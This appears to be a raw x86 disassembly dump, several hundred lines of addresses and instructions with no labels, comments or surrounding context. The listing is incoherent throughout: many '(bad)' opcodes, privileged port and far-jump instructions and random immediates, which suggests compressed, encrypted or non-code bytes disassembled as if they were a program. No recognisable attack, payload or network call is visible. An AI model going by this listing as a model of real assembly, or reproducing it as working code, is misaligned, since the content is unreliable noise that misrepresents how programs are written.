  4133c4:	xchg   dl,bl
  4133c6:	inc    eax
  4133c7:	mov    ah,0xa6
  4133c9:	mov    dl,0x9c
  4133cb:	outs   dx,BYTE PTR ds:[esi]
  4133cc:	repnz hlt 
  4133ce:	add    al,0xdc
  4133d0:	dec    edx
  4133d1:	mov    bh,0x2b
  4133d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133d4:	fnstenv [ebp-0x15a3b2bc]
  4133da:	add    DWORD PTR [eax+0x11825d85],0x5b1d6a0a
  4133e4:	mov    dh,0xd1
  4133e6:	add    eax,0x1b084eb1
  4133eb:	or     dl,BYTE PTR [esi+ecx*4+0x3e]
  4133ef:	sub    ch,BYTE PTR [esi-0x35]
  4133f2:	ret    0x469
  4133f5:	imul   ebp,DWORD PTR [eax+eax*4+0x1b],0xffffffff
  4133fa:	mov    dh,0x76
  4133fc:	pop    ebx
  4133fd:	push   0xa628adbb
  413402:	stos   BYTE PTR es:[edi],al
  413403:	pop    esi
  413404:	sub    BYTE PTR [ebx-0x11],dl
  413407:	jbe    0x4133bf
  413409:	pop    ebp
  41340a:	fcom   DWORD PTR [esi]
  41340c:	popf   
  41340d:	rcr    DWORD PTR ds:0x22f9a655,0xd1
  413414:	or     BYTE PTR [bx+di+0x70],dl
  413418:	(bad)  [esi-0x7a97f935]
  41341e:	lods   eax,DWORD PTR ds:[esi]
  41341f:	(bad)  
  413420:	int    0x89
  413422:	mov    eax,0x7d9cd4b5
  413427:	fidiv  DWORD PTR [ebp+0x1c]
  41342a:	pop    es
  41342b:	repnz cwde 
  41342d:	mov    BYTE PTR [ebx],bl
  41342f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413430:	mov    al,ds:0x57f05451
  413435:	jl     0x41343e
  413437:	shl    BYTE PTR [esi-0x15],1
  41343a:	out    0x47,al
  41343c:	and    ebp,DWORD PTR [esi-0x5f]
  41343f:	sar    DWORD PTR [edx-0x77595dab],1
  413445:	ins    DWORD PTR es:[edi],dx
  413446:	test   DWORD PTR [esi*1+0x26f72a92],edi
  41344d:	mov    eax,0xf88bb5b5
  413452:	outs   dx,DWORD PTR ds:[esi]
  413453:	push   ss
  413454:	add    ecx,DWORD PTR [edx-0x1a]
  413457:	(bad)  [esi]
  413459:	retf   0x94c2
  41345c:	xchg   edx,eax
  41345d:	dec    ecx
  41345e:	xchg   edi,eax
  41345f:	inc    ebp
  413460:	lea    ebx,[edi+ebx*4-0x2f]
  413464:	sbb    eax,0x2f76db44
  413469:	les    edi,FWORD PTR [ecx-0x4f592b8e]
  41346f:	push   eax
  413470:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413471:	test   al,0x89
  413473:	add    BYTE PTR [edx-0x12],0xd
  413477:	fwait
  413478:	mov    ch,0x44
  41347a:	mov    ah,0x1b
  41347c:	iret   
  41347d:	icebp  
  41347e:	arpl   WORD PTR [edx],ax
  413480:	dec    edx
  413481:	mov    ecx,0x175b8d80
  413486:	ins    BYTE PTR es:[edi],dx
  413487:	pop    ds
  413488:	add    cl,BYTE PTR [ebx]
  41348a:	add    BYTE PTR cs:[edi+0xeb76da3],dl
  413491:	add    esi,esi
  413493:	sub    DWORD PTR [eax],esp
  413495:	ficom  WORD PTR [ebx+0x62]
  413498:	mov    edi,0x8b9bb55a
  41349d:	gs (bad) 
  41349f:	aas    
  4134a0:	leave  
  4134a1:	outs   dx,BYTE PTR ds:[esi]
  4134a2:	dec    ecx
  4134a3:	cmp    al,BYTE PTR [ebx+0x2e83a963]
  4134a9:	cmp    BYTE PTR [esi-0x26],al
  4134ac:	hlt    
  4134ad:	addr16 pop edi
  4134af:	retf   
  4134b0:	dec    eax
  4134b1:	pop    ebp
  4134b2:	adc    bl,bl
  4134b4:	ins    DWORD PTR es:[edi],dx
  4134b5:	adc    al,0x6b
  4134b7:	mov    ah,0x99
  4134b9:	bound  eax,QWORD PTR [ecx]
  4134bb:	inc    DWORD PTR [ebx+0x6db5b116]
  4134c1:	ret    0x83b4
  4134c4:	mov    DWORD PTR [ebp-0x2493a1b3],ebx
  4134ca:	test   DWORD PTR [ebp+0x52767225],eax
  4134d0:	into   
  4134d1:	dec    ebp
  4134d2:	ror    ebx,1
  4134d4:	or     edx,ebx
  4134d6:	push   eax
  4134d7:	je     0x413544
  4134d9:	xchg   ebx,eax
  4134da:	into   
  4134db:	stos   BYTE PTR es:[edi],al
  4134dc:	sbb    esi,ecx
  4134de:	int3   
  4134df:	(bad)  
  4134e0:	push   0x2358a8eb
  4134e5:	adc    DWORD PTR [esi],ecx
  4134e7:	icebp  
  4134e8:	push   0xba21b074
  4134ed:	mov    ch,0x86
  4134ef:	pop    esp
  4134f0:	push   0x39c1fa37
  4134f5:	rcl    DWORD PTR [esi+0x40],0x47
  4134f9:	cmp    al,BYTE PTR [eax-0x523e0dd0]
  4134ff:	add    DWORD PTR [eax+ebx*4],esi
  413502:	pop    ebx
  413503:	(bad)  
  413504:	cmp    cl,dh
  413506:	jmp    0x9355:0x436d156b
  41350d:	pop    ebx
  41350e:	aam    0x8a
  413510:	add    eax,0x76f2e001
  413515:	shl    dl,1
  413517:	inc    ecx
  413518:	sbb    eax,DWORD PTR [eax]
  41351a:	mov    ecx,0xa5ebec89
  41351f:	test   edx,edx
  413521:	mov    dh,0x1b
  413523:	icebp  
  413524:	ja     0x4134fd
  413526:	cmc    
  413527:	and    cl,BYTE PTR [edx+0x59]
  41352a:	push   ss
  41352b:	or     eax,DWORD PTR [ebp-0x53955956]
  413531:	sub    ch,BYTE PTR cs:[esi+0x4b]
  413535:	or     ebp,ebp
  413537:	adc    BYTE PTR [esi],dl
  413539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41353a:	ror    BYTE PTR [edx-0x2628682c],1
  413540:	and    eax,0xd1b6e009
  413545:	push   0xe92c7fb4
  41354a:	mov    ebx,0x6c6e16f2
  41354f:	nop
  413550:	mov    ch,0xca
  413552:	mov    bh,0x9d
  413554:	lods   al,BYTE PTR ds:[esi]
  413555:	lods   al,BYTE PTR ds:[esi]
  413556:	lock mov al,0x65
  413559:	mov    ds:0x6dacd821,al
  41355e:	pop    ebx
  41355f:	std    
  413560:	mov    dh,0xb0
  413562:	push   ebp
  413563:	mov    edx,0x38eff82e
  413568:	inc    ebx
  413569:	or     BYTE PTR [edx+0x2c2ef20f],dh
  41356f:	ins    DWORD PTR es:[edi],dx
  413570:	fisttp DWORD PTR [edx+0x50]
  413573:	js     0x413573
  413575:	or     cl,bl
  413577:	nop
  413578:	cmp    BYTE PTR [esp+edx*4+0x6d],0x61
  41357d:	mov    ebx,0xb950ea35
  413582:	sub    DWORD PTR [edx-0x1d],edi
  413585:	pop    eax
  413586:	dec    ebp
  413587:	pop    ecx
  413588:	mov    ebx,0x60b5b800
  41358d:	bound  edx,QWORD PTR [ebx+0xe]
  413590:	aad    0x6
  413592:	cdq    
  413593:	sbb    BYTE PTR [ebx],cl
  413595:	or     ecx,DWORD PTR [ebp+0x40]
  413598:	mul    BYTE PTR [edx+0x7]
  41359b:	call   DWORD PTR [ebp-0x72]
  41359e:	fcmovnbe st,st(6)
  4135a0:	mov    eax,0x1be7d6c
  4135a5:	stos   DWORD PTR es:[edi],eax
  4135a6:	cld    
  4135a7:	fwait
  4135a8:	fwait
  4135a9:	push   esi
  4135aa:	lods   eax,DWORD PTR ds:[esi]
  4135ab:	inc    eax
  4135ac:	mov    ch,0x6c
  4135ae:	ins    BYTE PTR es:[edi],dx
  4135af:	das    
  4135b0:	icebp  
  4135b1:	(bad)  
  4135b2:	les    eax,FWORD PTR [edi]
  4135b4:	jmp    0x41358c
  4135b6:	add    eax,0x88517db0
  4135bb:	adc    al,BYTE PTR [edx]
  4135bd:	pop    es
  4135be:	out    0xe8,eax
  4135c0:	add    eax,0xc45112da
  4135c5:	add    BYTE PTR [ebp-0x2e],ah
  4135c8:	mov    cl,0xd0
  4135ca:	test   al,0xda
  4135cc:	call   0x1c9fc55b
  4135d1:	inc    ebp
  4135d2:	rol    DWORD PTR [esi-0x50],1
  4135d5:	mov    al,0xd5
  4135d7:	or     ecx,esi
  4135d9:	mov    dh,0xe5
  4135db:	mov    es,WORD PTR [eax+0xd0d0b0b]
  4135e1:	inc    edx
  4135e2:	pop    ebx
  4135e3:	lahf   
  4135e4:	loop   0x4135df
  4135e6:	mov    bl,0x7b
  4135e8:	fsubr  DWORD PTR [edx-0x29ef65d2]
  4135ee:	fwait
  4135ef:	mov    ds:0xf5b44de0,eax
  4135f4:	shl    DWORD PTR [esi-0x1a],0x4a
  4135f8:	pop    esi
  4135fa:	enter  0x453,0x26
  4135fe:	add    al,0xdb
  413600:	inc    esi
  413601:	mov    ebx,0x6bd411ec
  413606:	(bad)  
  413607:	in     al,dx
  413608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413609:	mov    ch,BYTE PTR [ebp+0x6b]
  41360c:	pop    ss
  41360d:	dec    edx
  41360e:	xor    edx,DWORD PTR [esi]
  413610:	inc    ecx
  413611:	or     ebp,DWORD PTR gs:[ebx+0x3c]
  413615:	jno    0x41366b
  413617:	mov    ch,0x5d
  413619:	ror    DWORD PTR [ebp+0x7edad4d],0xf2
  413620:	mov    dh,0xb5
  413622:	jne    0x4135cd
  413624:	stos   DWORD PTR es:[edi],eax
  413625:	xchg   BYTE PTR [edi],dl
  413627:	(bad)
  41362a:	aaa    
  41362b:	iret   
  41362c:	mov    esp,0xa5db041d
  413631:	pop    edi
  413632:	jecxz  0x41361a
  413634:	mov    ecx,0xb1c5be6e
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	mov    ch,0xb5
  41363c:	fnsave [edx]
  41363e:	repnz inc DWORD PTR [ebx+eax*8-0x47]
  413643:	jno    0x4136a0
  413645:	fcomp  st(2)
  413647:	push   edx
  413648:	mov    esi,0x25bc860a
  41364d:	retf   0x5003
  413650:	fcmovnbe st,st(6)
  413652:	adc    DWORD PTR [ebp+0x8],esi
  413655:	add    ebp,DWORD PTR [ebx+0x44]
  413658:	imul   ebp,DWORD PTR [edx+0x65],0xffffffca
  41365c:	fsubr  QWORD PTR [eax-0x7e]
  41365f:	(bad)  
  413660:	cld    
  413661:	scas   al,BYTE PTR es:[edi]
  413662:	sbb    BYTE PTR ds:0x35df2aa3,0xba
  413669:	ins    DWORD PTR es:[edi],dx
  41366a:	dec    ebx
  41366b:	pop    ds
  41366c:	das    
  41366d:	pop    ebp
  41366e:	aam    0x6e
  413670:	inc    esp
  413671:	xor    BYTE PTR [eax+0xd6c50df],0xa0
  413678:	and    edi,DWORD PTR [ecx]
  41367a:	sbb    BYTE PTR [esi],cl
  41367c:	pop    ecx
  41367d:	xor    al,cl
  41367f:	mov    dl,0x6d
  413681:	push   eax
  413682:	sbb    BYTE PTR [edx+eiz*2-0x4eb5e62f],bh
  413689:	aam    0x54
  41368b:	out    0xfd,eax
  41368d:	jno    0x413670
  41368f:	jmp    0x4136de
  413691:	push   ebp
  413692:	aaa    
  413693:	xchg   esi,eax
  413694:	push   eax
  413695:	out    0xf3,eax
  413697:	ins    BYTE PTR es:[edi],dx
  413698:	(bad)  
  413699:	pop    esp
  41369a:	ret    
  41369b:	inc    edx
  41369c:	mov    ebx,0xbcbfb5b0
  4136a1:	loopne 0x41362f
  4136a3:	in     eax,0x2c
  4136a5:	bound  ebp,QWORD PTR [ebp-0x5a692712]
  4136ab:	in     eax,dx
  4136ac:	mov    bh,0xa4
  4136ae:	push   ebx
  4136af:	sub    DWORD PTR [esi+0x571788f3],ebx
  4136b5:	lods   eax,DWORD PTR ds:[esi]
  4136b6:	push   0xffffffb7
  4136b8:	push   es
  4136b9:	sbb    DWORD PTR [eax+0x5958f7d4],esp
  4136bf:	inc    ebx
  4136c0:	add    al,0x9b
  4136c2:	mov    ds:0x2c91d21b,al
  4136c7:	adc    ebp,eax
  4136c9:	aas    
  4136ca:	mov    esp,0x5e7340b0
  4136cf:	jle    0x413710
  4136d1:	inc    ebx
  4136d2:	push   ss
  4136d3:	push   edx
  4136d4:	add    dl,al
  4136d6:	(bad)  
  4136d8:	mov    bh,BYTE PTR [eax-0x625eae1]
  4136de:	jae    0x413687
  4136e0:	ret    0xdb6d
  4136e3:	pop    edx
  4136e4:	bound  edi,QWORD PTR [edx+0x43]
  4136e7:	push   edx
  4136e8:	es sahf 
  4136ea:	and    bh,ah
  4136ec:	shr    BYTE PTR [eax+eiz*4+0x53b6ddb6],cl
  4136f3:	outs   dx,DWORD PTR ds:[esi]
  4136f4:	bound  ebx,QWORD PTR [ebp+0x4d3b719e]
  4136fa:	(bad)  
  4136fb:	outs   dx,BYTE PTR ds:[esi]
  4136fc:	mov    ch,0x8d
  4136fe:	pop    edx
  4136ff:	xor    ebx,DWORD PTR [ecx-0x51]
  413702:	ss in  eax,0x68
  413705:	or     BYTE PTR [ebp-0x45],ch
  413708:	ins    DWORD PTR es:[edi],dx
  413709:	in     eax,dx
  41370a:	xor    al,BYTE PTR [ebx+0x3b061132]
  413710:	ret    0x4d30
  413713:	mov    ds,WORD PTR [esi+0x6ed0cdc6]
  413719:	lods   eax,DWORD PTR ds:[esi]
  41371a:	pop    esi
  41371b:	push   ecx
  41371c:	xor    cl,dl
  41371e:	dec    edx
  41371f:	stos   BYTE PTR es:[edi],al
  413720:	lods   eax,DWORD PTR ds:[esi]
  413721:	repnz add dh,BYTE PTR ss:[edi]
  413725:	mov    dh,0xcb
  413727:	jmp    0x10:0x5d43d069
  41372e:	div    BYTE PTR [esi]
  413730:	adc    ecx,DWORD PTR [ebx]
  413732:	(bad)  [eax-0x80]
  413735:	fwait
  413736:	rcl    BYTE PTR [eax],1
  413738:	in     eax,0x35
  41373a:	and    eax,0x176d6daa
  41373f:	les    ecx,FWORD PTR [ebx+0x25c87a3d]
  413745:	mul    ebx
  413747:	ins    DWORD PTR es:[edi],dx
  413748:	sbb    esp,DWORD PTR [eax]
  41374a:	push   ss
  41374b:	retf   0x2dac
  41374e:	lea    ebp,ds:0x56a8f8c2
  413754:	xor    eax,0x4699ce05
  413759:	pop    ebx
  41375a:	popa   
  41375b:	fist   DWORD PTR [esi]
  41375d:	(bad)  [eax-0x26]
  413760:	push   ebx
  413761:	push   esi
  413762:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413763:	lods   al,BYTE PTR ds:[esi]
  413764:	xor    bh,BYTE PTR [eax-0x25]
  413767:	(bad)  
  413768:	outs   dx,BYTE PTR ds:[esi]
  413769:	or     esi,ecx
  41376b:	retf   
  41376c:	push   eax
  41376d:	mov    edx,0x79aab9a8
  413772:	loopne 0x4137e9
  413774:	mov    bh,0x6
  413776:	sub    BYTE PTR [ebp-0x3e939807],0x67
  41377d:	push   eax
  41377e:	adc    al,bl
  413780:	mov    eax,ds:0x3e7db6e8
  413785:	xchg   ebx,eax
  413786:	pop    ss
  413787:	cs push ebx
  413789:	sbb    DWORD PTR [edi-0x5ab4fa86],esp
  41378f:	mov    al,ds:0xfaef09aa
  413794:	pop    ss
  413795:	pop    ss
  413796:	or     cl,BYTE PTR [ebx]
  413798:	lods   al,BYTE PTR ds:[esi]
  413799:	popf   
  41379a:	sbb    DWORD PTR [edi-0x2503e27e],ebp
  4137a0:	cs mov ch,ch
  4137a3:	or     eax,DWORD PTR [esi-0x29]
  4137a6:	and    edi,DWORD PTR [esi-0x2222700d]
  4137ac:	fdiv   DWORD PTR ss:[esi+0x14a17131]
  4137b3:	push   eax
  4137b4:	sbb    eax,0x75c45580
  4137b9:	pop    ebx
  4137ba:	mov    al,ds:0x8400442c
  4137bf:	cmp    BYTE PTR gs:0xd414b5d7,bl
  4137c6:	push   eax
  4137c7:	jns    0x4137ff
  4137c9:	or     eax,eax
  4137cb:	ins    DWORD PTR es:[edi],dx
  4137cc:	sub    dl,bl
  4137ce:	add    cl,dh
  4137d0:	pop    ss
  4137d1:	lods   eax,DWORD PTR ds:[esi]
  4137d2:	bound  edi,QWORD PTR [ecx+0x35b6e388]
  4137d8:	inc    ebp
  4137d9:	loop   0x41382e
  4137db:	cwde   
  4137dc:	scas   eax,DWORD PTR es:[edi]
  4137dd:	daa    
  4137de:	sub    bl,BYTE PTR [esi]
  4137e0:	push   es
  4137e1:	dec    ebx
  4137e2:	fild   DWORD PTR [esi-0x5bb5bba0]
  4137e8:	std    
  4137e9:	cmc    
  4137ea:	das    
  4137eb:	push   eax
  4137ec:	mov    ebx,0x1752c0
  4137f1:	and    DWORD PTR [edx],0xda0c538
  4137f7:	push   eax
  4137f8:	dec    ebx
  4137f9:	sub    esp,esp
  4137fb:	dec    edi
  4137fc:	mov    edi,0xdb015393
  413801:	scas   al,BYTE PTR es:[edi]
  413802:	mov    al,ds:0xdfd7c24f
  413807:	adc    BYTE PTR [ecx],ah
  413809:	fmul   DWORD PTR [edx+0x54]
  41380c:	mov    eax,ds:0x1a02adc7
  413811:	and    esp,DWORD PTR [eax+0x1]
  413814:	inc    ebx
  413815:	fbstp  TBYTE PTR [edi+0x36ddd159]
  41381b:	inc    edi
  41381c:	ins    DWORD PTR es:[edi],dx
  41381d:	out    0x8f,eax
  41381f:	ins    DWORD PTR es:[edi],dx
  413820:	or     eax,DWORD PTR [ebx-0x2b42eaef]
  413826:	cs xchg esp,eax
  413828:	mov    ds:0xa83ab517,al
  41382d:	sahf   
  41382e:	xchg   edx,eax
  41382f:	add    ebp,edx
  413831:	inc    edx
  413832:	mov    ebx,0x4d0dd6f8
  413837:	(bad)  
  413838:	call   0xd4fb2bc3
  41383d:	push   ebp
  41383e:	mov    ch,0xc
  413840:	sub    BYTE PTR [esi+0x2],bl
  413843:	das    
  413844:	rcr    BYTE PTR [ebx+ecx*2],0xb1
  413848:	ins    DWORD PTR es:[edi],dx
  413849:	pop    ebx
  41384a:	and    esp,DWORD PTR [ecx+0x2071f8c2]
  413850:	test   DWORD PTR [ebx+ebx*2+0x2f6b7443],ecx
  413857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413858:	push   ebx
  413859:	pop    es
  41385a:	sbb    DWORD PTR [esi-0x2c],esi
  41385d:	add    bh,BYTE PTR [ecx-0x5cefb54a]
  413863:	dec    edi
  413864:	dec    ecx
  413865:	inc    eax
  413866:	mov    ch,0xed
  413868:	ret    0xfeb6
  41386b:	ins    BYTE PTR es:[edi],dx
  41386c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41386d:	fs mov ch,0x27
  413870:	ud2    
  413872:	pushf  
  413873:	ret    0x83b6
  413876:	jmp    0x2a1d:0x5cc738b6
  41387d:	out    dx,al
  41387e:	jno    0x413859
  413880:	dec    edx
  413881:	push   esp
  413882:	je     0x413889
  413884:	mov    bh,0xb0
  413886:	out    0x6e,eax
  413888:	mov    edi,0x85da97cb
  41388d:	lods   eax,DWORD PTR ds:[esi]
  41388e:	sub    edi,DWORD PTR [edi+0x484c25c7]
  413894:	pop    ecx
  413895:	pop    edi
  413896:	add    ecx,DWORD PTR [esi+esi*4+0x51]
  41389a:	pop    ebp
  41389b:	adc    BYTE PTR [edx+0x6d],bl
  41389e:	ins    BYTE PTR es:[edi],dx
  41389f:	mov    ds:0xc6adad8c,al
  4138a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138a5:	or     BYTE PTR [edx+0x28551e7e],bh
  4138ab:	fs fcmovnbe st,st(6)
  4138ae:	mov    dh,0x82
  4138b0:	inc    esp
  4138b1:	sub    DWORD PTR ds:0x7068dcc2,eax
  4138b8:	push   ss
  4138b9:	dec    edx
  4138ba:	adc    BYTE PTR [ebx],cl
  4138bc:	pop    ds
  4138bd:	aad    0xb2
  4138bf:	pop    esi
  4138c0:	(bad)  
  4138c1:	xchg   edi,eax
  4138c2:	ficomp DWORD PTR [eax+0x58]
  4138c5:	cmp    ch,BYTE PTR [edx+0x52]
  4138c8:	or     DWORD PTR [ebp+ebx*2-0x6b],esi
  4138cc:	nop
  4138cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138ce:	sub    BYTE PTR [ebp+0x29aa00e5],0xe1
  4138d5:	mov    al,ds:0x96d1ceff
  4138da:	cs push ecx
  4138dc:	scas   eax,DWORD PTR es:[edi]
  4138dd:	push   cs
  4138de:	or     al,0xe9
  4138e0:	pop    esp
  4138e1:	sub    ecx,edx
  4138e3:	cs mov al,0xb4
  4138e6:	loope  0x413901
  4138e8:	outs   dx,BYTE PTR ds:[esi]
  4138e9:	ror    DWORD PTR [edi],1
  4138eb:	sub    DWORD PTR [edx+0x2f],eax
  4138ee:	add    eax,0x72ba551b
  4138f3:	mov    cs,edx
  4138f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138f6:	xchg   esi,eax
  4138f7:	xor    al,0xd7
  4138f9:	ret    0xd1b6
  4138fc:	mov    ebx,0x5c3dd218
  413901:	or     BYTE PTR [eax-0x22579264],bh
  413907:	mov    dh,0x2d
  413909:	hlt    
  41390a:	scas   eax,DWORD PTR es:[edi]
  41390b:	sub    BYTE PTR [eax-0x73963617],0x10
  413912:	aam    0x6e
  413914:	popa   
  413915:	sar    DWORD PTR [ebx+eiz*2],1
  413918:	add    al,0x35
  41391a:	push   0x55ada5b7
  41391f:	in     al,dx
  413920:	mov    eax,ds:0xd565ddec
  413925:	pop    edx
  413926:	sbb    eax,0xa58daab
  41392b:	or     ch,BYTE PTR [edx+0x684dda00]
  413931:	mov    bh,0x76
  413933:	test   eax,0x2339aa78
  413938:	stos   BYTE PTR es:[edi],al
  413939:	mov    WORD PTR [eax],cs
  41393b:	repz adc al,0xa9
  41393e:	mov    ch,0xb6
  413940:	sbb    DWORD PTR [edx+esi*1+0x62b50bc8],eax
  413947:	sub    DWORD PTR [ebp+0x6b],ebp
  41394a:	fld    TBYTE PTR [ebp-0x5]
  41394d:	sub    al,0x5d
  41394f:	(bad)  
  413950:	repnz (bad) 
  413954:	lock imul ebp,eax,0x5a
  413958:	fdiv   DWORD PTR [esi-0x64d585ff]
  41395e:	popf   
  41395f:	sub    BYTE PTR [esi+0x40],dh
  413962:	mov    bh,0x95
  413964:	pop    edi
  413965:	push   0x20
  413967:	(bad)  
  413968:	and    ecx,edx
  41396a:	rcl    BYTE PTR [ebp+0x0],1
  41396d:	sbb    bh,BYTE PTR ds:0x2dbb46d6
  413973:	in     al,dx
  413974:	pop    ecx
  413975:	xor    DWORD PTR [ebp+0x115ab06c],0xffffffee
  41397c:	ins    BYTE PTR es:[edi],dx
  41397d:	sub    al,0x14
  41397f:	(bad)  [esi+0x26]
  413982:	pop    esp
  413983:	push   es
  413984:	int    0x3f
  413986:	fwait
  413987:	call   0x15dc:0xf5457608
  41398e:	iret   
  41398f:	and    esi,DWORD PTR [esp+edx*2-0x23]
  413993:	fisub  DWORD PTR [eax]
  413995:	xor    al,BYTE PTR [edx-0x3f1e7927]
  41399b:	shr    BYTE PTR [eax],1
  41399d:	ins    BYTE PTR es:[edi],dx
  41399e:	sub    eax,0x279d5349
  4139a3:	adc    eax,DWORD PTR [esi-0x4bbc9293]
  4139a9:	call   0x1ad66568
  4139ae:	and    esp,DWORD PTR [edx+0x51]
  4139b1:	test   DWORD PTR [ebp-0x5f],ebp
  4139b4:	push   ebp
  4139b5:	stos   BYTE PTR es:[edi],al
  4139b6:	add    al,0x10
  4139b8:	add    eax,0x819b1feb
  4139bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139be:	test   DWORD PTR [ecx],ecx
  4139c0:	jmp    0x413a0a
  4139c2:	in     al,dx
  4139c3:	inc    eax
  4139c4:	xchg   DWORD PTR [edx],esi
  4139c6:	xor    DWORD PTR [esi],edx
  4139c8:	mov    dh,0x5
  4139ca:	inc    ebx
  4139cb:	ds icebp 
  4139cd:	mov    al,BYTE PTR [eax+0x7414af23]
  4139d3:	add    al,0x17
  4139d5:	mov    dh,0x5e
  4139d7:	mul    DWORD PTR [ebx+esi*2-0x79]
  4139db:	xor    edx,ebx
  4139dd:	push   0xba725da1
  4139e2:	imul   edx,DWORD PTR [eax+0x610dd770],0xffffffb8
  4139e9:	ins    DWORD PTR es:[edi],dx
  4139ea:	mov    cl,0x35
  4139ec:	inc    esi
  4139ed:	and    eax,DWORD PTR [ebx-0xa38434]
  4139f3:	fdivr  st(2),st
  4139f5:	pop    edi
  4139f6:	jb     0x413a49
  4139f8:	mov    ebx,0x2e022378
  4139fd:	add    BYTE PTR [esi],ch
  4139ff:	jne    0x413a01
  413a01:	mov    al,ds:0xdaddb695
  413a06:	mov    dh,0x53
  413a08:	ss ins BYTE PTR es:[edi],dx
  413a0a:	mov    dl,BYTE PTR [ebx]
  413a0c:	mov    BYTE PTR [ebx],al
  413a0e:	xlat   BYTE PTR ds:[ebx]
  413a0f:	or     al,0x3e
  413a11:	xchg   esi,eax
  413a12:	mov    dh,0xa5
  413a14:	test   ecx,eax
  413a16:	shr    cl,cl
  413a18:	(bad)  
  413a19:	pop    ss
  413a1a:	cs add eax,0xb17d6e96
  413a20:	fst    QWORD PTR [eax-0x22]
  413a23:	and    bh,ch
  413a25:	cli    
  413a26:	test   al,0x5e
  413a28:	cmp    eax,0xb7041604
  413a2d:	push   cs
  413a2e:	add    bh,BYTE PTR [esi+0x34]
  413a31:	bound  esi,QWORD PTR [ebx]
  413a33:	xor    edx,ebp
  413a35:	jo     0x4139da
  413a37:	jo     0x413a67
  413a39:	ret    0x1f49
  413a3c:	not    ecx
  413a3e:	stos   BYTE PTR es:[edi],al
  413a3f:	(bad)  
  413a40:	and    eax,0x8737047c
  413a45:	call   0x7018d9a
  413a4a:	outs   dx,DWORD PTR ds:[esi]
  413a4b:	ret    0x5ebe
  413a4e:	pusha  
  413a4f:	mov    ds:0x867acd8b,eax
  413a54:	scas   al,BYTE PTR es:[edi]
  413a55:	mov    ebp,0x5436c26
  413a5a:	or     ebx,ebx
  413a5c:	push   cs
  413a5d:	inc    edi
  413a5e:	or     al,0x67
  413a60:	pop    edi
  413a61:	rcl    eax,0x57
  413a64:	or     dl,BYTE PTR ss:[ecx*1+0x32b3346]
  413a6c:	xchg   ecx,eax
  413a6d:	mov    al,ds:0x74d85c2d
  413a72:	add    eax,0x2b73b57c
  413a77:	(bad)  
  413a78:	gs add eax,0xead0b0b
  413a7e:	les    esi,FWORD PTR ds:0xc043c18e
  413a84:	ins    DWORD PTR es:[edi],dx
  413a85:	imul   edx,DWORD PTR [esi+0x14],0xffffffb2
  413a89:	push   cs
  413a8a:	lock not ebp
  413a8d:	ret    0xb5b6
  413a90:	pop    ebx
  413a91:	stos   BYTE PTR es:[edi],al
  413a92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a93:	sar    cl,cl
  413a95:	adc    al,0x7a
  413a97:	sahf   
  413a98:	push   0xbb54c6d
  413a9d:	fcmovnb st,st(2)
  413a9f:	daa    
  413aa0:	xchg   ecx,eax
  413aa1:	outs   dx,BYTE PTR ds:[esi]
  413aa2:	pop    DWORD PTR [esi-0x2eb11fd2]
  413aa8:	adc    ebx,ecx
  413aaa:	das    
  413aab:	mov    al,0xb0
  413aad:	ins    BYTE PTR es:[edi],dx
  413aae:	lea    ecx,[edx+0x79a5009d]
  413ab4:	xchg   edi,eax
  413ab5:	sbb    dl,BYTE PTR [eiz*4+0x23ef04d]
  413abc:	outs   dx,BYTE PTR ds:[esi]
  413abd:	add    BYTE PTR [ebx],cl
  413abf:	mov    bh,0xd
  413ac1:	mov    dh,0xd
  413ac3:	jb     0x413ab4
  413ac5:	cwde   
  413ac6:	and    ebp,DWORD PTR [edi+0x5df3ac0b]
  413acc:	add    ah,bl
  413ace:	push   0xa1a1f63e
  413ad3:	ret    
  413ad4:	repnz aaa 
  413ad6:	mov    dh,0x8e
  413ad8:	mov    bh,bl
  413ada:	xchg   BYTE PTR [edx-0x6eb7dd0e],ch
  413ae0:	mov    ?,WORD PTR [edx+0xe50ba8]
  413ae6:	adc    eax,0xc4c561d9
  413aeb:	pop    edx
  413aec:	xchg   ebx,eax
  413aed:	or     dh,BYTE PTR [edi+0x48cc3605]
  413af3:	arpl   WORD PTR [ecx+edi*4-0x5c],di
  413af7:	int3   
  413af8:	dec    esp
  413af9:	fstp   QWORD PTR [eax-0x28]
  413afc:	fdivr  st,st(6)
  413afe:	mov    ecx,0x8cc41c39
  413b03:	adc    eax,0x56c10f62
  413b08:	fadd   DWORD PTR [edi+ecx*8]
  413b0b:	pop    ds
  413b0c:	or     DWORD PTR [ebx+0x6a5df005],0x70fe02db
  413b16:	ja     0x413aa8
  413b18:	or     BYTE PTR [eax],cl
  413b1a:	mov    bl,0x24
  413b1c:	lods   eax,DWORD PTR ds:[esi]
  413b1d:	push   ecx
  413b1e:	mov    al,0xbc
  413b20:	(bad)  
  413b21:	aas    
  413b22:	add    ah,bh
  413b24:	call   0x5d6e156b
  413b29:	fcmovu st,st(2)
  413b2b:	(bad)  
  413b2d:	fwait
  413b2e:	sahf   
  413b2f:	outs   dx,DWORD PTR ds:[esi]
  413b30:	fst    QWORD PTR [ecx+edx*4-0x71]
  413b34:	(bad)  
  413b35:	mov    edx,0xc80136aa
  413b3a:	rcr    BYTE PTR [ebp+0xd11c2be],1
  413b40:	adc    DWORD PTR [edi+0x622e1daa],edx
  413b46:	mov    bh,0xa
  413b48:	jbe    0x413b0e
  413b4a:	lods   eax,DWORD PTR ds:[esi]
  413b4b:	inc    edi
  413b4c:	das    
  413b4d:	lahf   
  413b4e:	pop    eax
  413b4f:	inc    esp
  413b50:	add    ecx,DWORD PTR [ebp-0x4a]
  413b53:	mov    ds:0x8fb76dad,al
  413b58:	in     al,0x80
  413b5a:	push   esi
  413b5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b5c:	xchg   esp,eax
